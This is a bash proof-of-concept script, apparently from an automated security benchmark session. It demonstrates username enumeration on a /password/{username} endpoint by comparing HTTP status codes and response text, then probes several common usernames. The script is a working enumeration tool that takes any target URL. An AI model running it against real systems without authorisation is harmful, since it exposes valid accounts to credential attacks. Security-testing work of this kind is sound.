#!/bin/bash
# POC: Demonstrates user enumeration vulnerability via different HTTP status codes and error messages on the /password/{username} endpoint
# Target: ./repo
# Created: 2025-11-04T17:32:13.794Z
# Session: benchmark-XBEN-027-24-mhku77j0

# User Enumeration via HTTP Status Codes POC
# This script demonstrates how different HTTP status codes and messages reveal user existence

TARGET="${1:-http://localhost:8080}"
VALID_USER="test"
INVALID_USER="nonexistentuser12345"

echo "=== User Enumeration via HTTP Status Codes ==="
echo "Target: $TARGET"
echo ""

echo "[*] Testing with VALID user: $VALID_USER"
VALID_RESPONSE=$(curl -s -i "$TARGET/password/$VALID_USER")
VALID_STATUS=$(echo "$VALID_RESPONSE" | head -n 1)
VALID_BODY=$(echo "$VALID_RESPONSE" | tail -n +2)

echo "Response Status:"
echo "$VALID_STATUS"
echo ""
echo "Response Body (first 500 chars):"
echo "$VALID_BODY" | head -c 500
echo ""
echo ""

echo "[*] Testing with INVALID user: $INVALID_USER"
INVALID_RESPONSE=$(curl -s -i "$TARGET/password/$INVALID_USER")
INVALID_STATUS=$(echo "$INVALID_RESPONSE" | head -n 1)
INVALID_BODY=$(echo "$INVALID_RESPONSE" | tail -n +2)

echo "Response Status:"
echo "$INVALID_STATUS"
echo ""
echo "Response Body (first 500 chars):"
echo "$INVALID_BODY" | head -c 500
echo ""
echo ""

echo "[*] VULNERABILITY ANALYSIS:"
echo ""

# Check if status codes differ
if [[ "$VALID_STATUS" != "$INVALID_STATUS" ]]; then
    echo "✓ VULNERABLE: HTTP status codes differ between valid and invalid users"
    echo "  Valid user returns: $VALID_STATUS"
    echo "  Invalid user returns: $INVALID_STATUS"
    echo ""
fi

# Check for error messages that reveal user existence
if echo "$INVALID_BODY" | grep -qi "user.*not.*found\|does.*not.*exist"; then
    echo "✓ VULNERABLE: Response contains message revealing non-existent user"
    echo "  Message found in invalid user response"
    echo ""
fi

if echo "$VALID_BODY" | grep -qi "welcome\|password"; then
    echo "✓ VULNERABLE: Response contains different content for valid user"
    echo "  Valid user response shows password form/welcome message"
    echo ""
fi

echo "[*] ENUMERATION TEST: Probing multiple usernames"
echo ""

USERNAMES=("test" "admin" "john" "alice" "nonexistent001" "fakeuserxyz")

echo "Username | Status Code | Contains 'Welcome' | Contains 'not found'"
echo "---------|-------------|--------------------|-----------------"

for user in "${USERNAMES[@]}"; do
    response=$(curl -s -i "$TARGET/password/$user" 2>/dev/null)
    status=$(echo "$response" | head -n 1 | grep -oP 'HTTP/[0-9.]+ \K[0-9]+')
    body=$(echo "$response" | tail -n +2)
    
    has_welcome=$(echo "$body" | grep -qi "welcome" && echo "YES" || echo "NO")
    has_not_found=$(echo "$body" | grep -qi "not.*found" && echo "YES" || echo "NO")
    
    printf "%-8s | %-11s | %-18s | %-17s\n" "$user" "$status" "$has_welcome" "$has_not_found"
done

echo ""
echo "[+] POC Complete: User enumeration is possible through HTTP status codes and response content"